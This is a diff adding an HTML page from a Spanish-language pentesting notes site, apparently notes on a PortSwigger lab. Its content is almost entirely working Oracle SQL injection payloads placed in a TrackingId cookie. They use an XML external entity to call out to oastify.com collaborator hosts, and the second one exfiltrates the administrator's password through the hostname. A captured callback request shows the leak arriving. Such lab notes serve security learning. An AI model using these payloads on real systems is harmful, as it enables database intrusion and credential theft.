@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;Oracle :&lt;/p&gt;&lt;div class=&quot;language-R highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;TrackingId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;+UNION+SELECT+EXTRACTVALUE(xmltype(&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;%3fxml+version%&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%3d&quot;UTF-8&quot;%&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DOCTYPE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&amp;lt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ENTITY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+%25+remote+SYSTEM+&quot;http%&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bixkdbjkewy7v26t6d9ep4em9df73zunj.oastify.com&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;+%25remote%&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;),&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dual&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>Oracle :</p>
+<div class="language-R highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">TrackingId</span><span class="o">=</span><span class="n">x</span><span class="s1">'+UNION+SELECT+EXTRACTVALUE(xmltype('</span><span class="o">&lt;%3fxml+version%</span><span class="m">3</span><span class="n">d</span><span class="s2">"1.0"</span><span class="o">+</span><span class="n">encoding</span><span class="o">%3d"UTF-8"%</span><span class="m">3</span><span class="n">f</span><span class="o">&gt;&lt;!</span><span class="n">DOCTYPE</span><span class="o">+</span><span class="n">root</span><span class="o">+</span><span class="p">[</span><span class="o">+&lt;!</span><span class="n">ENTITY</span><span class="o">+%25+remote+SYSTEM+"http%</span><span class="m">3</span><span class="n">a</span><span class="o">//</span><span class="n">bixkdbjkewy7v26t6d9ep4em9df73zunj.oastify.com</span><span class="o">/</span><span class="err">"</span><span class="o">&gt;+%25remote%</span><span class="m">3</span><span class="n">b</span><span class="p">]</span><span class="o">&gt;</span><span class="s1">'),'</span><span class="o">/</span><span class="n">l</span><span class="err">'</span><span class="p">)</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">dual</span><span class="o">--</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Query para enviar consultas por http aprovechándose de XXE :</p>
+
+<div class="language-R highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Cookie</span><span class="o">:</span><span class="w"> </span><span class="n">TrackingId</span><span class="o">=</span><span class="n">etAMxiggOe3gdB3i</span><span class="s1">'+UNION+SELECT+EXTRACTVALUE(xmltype('</span><span class="o">&lt;%3fxml+version%</span><span class="m">3</span><span class="n">d</span><span class="s2">"1.0"</span><span class="o">+</span><span class="n">encoding</span><span class="o">%3d"UTF-8"%</span><span class="m">3</span><span class="n">f</span><span class="o">&gt;&lt;!</span><span class="n">DOCTYPE</span><span class="o">+</span><span class="n">root</span><span class="o">+</span><span class="p">[</span><span class="o">+&lt;!</span><span class="n">ENTITY</span><span class="o">+%25+remote+SYSTEM+"http%</span><span class="m">3</span><span class="n">a</span><span class="o">//</span><span class="s1">'||(SELECT+password+FROM+users+WHERE+username%3d'</span><span class="n">administrator</span><span class="s1">')||'</span><span class="n">.q6xz1q7z2bmmjhu8usxtdj21xs3mret2i.oastify.com</span><span class="o">/</span><span class="err">"</span><span class="o">&gt;+%25remote%</span><span class="m">3</span><span class="n">b</span><span class="p">]</span><span class="o">&gt;</span><span class="s1">'),'</span><span class="o">/</span><span class="n">l</span><span class="err">'</span><span class="p">)</span><span class="o">+</span><span class="n">FROM</span><span class="o">+</span><span class="n">dual</span><span class="o">--</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Petición recibida</p>
+
+<pre><code class="language-request">GET / HTTP/1.0
+Host: s9zz7w8e15przthczh5p.q6xz1q7z2bmmjhu8usxtdj21xs3mret2i.oastify.com
+Content-Type: text/plain; charset=utf-8
+</code></pre>
+
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
